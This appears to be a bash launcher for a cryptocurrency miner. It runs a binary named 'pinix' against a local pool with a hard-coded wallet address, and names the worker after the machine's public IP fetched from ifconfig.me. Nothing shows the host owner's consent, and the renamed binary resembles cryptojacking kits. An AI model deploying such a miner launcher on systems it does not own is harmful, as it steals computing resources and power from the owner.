#!/bin/bash

POOL=127.0.0.1:2020
WALLET=0xf48d78548d348a72278d4e752b90d192b2fa17b5
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-new

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x -proto 3 $@
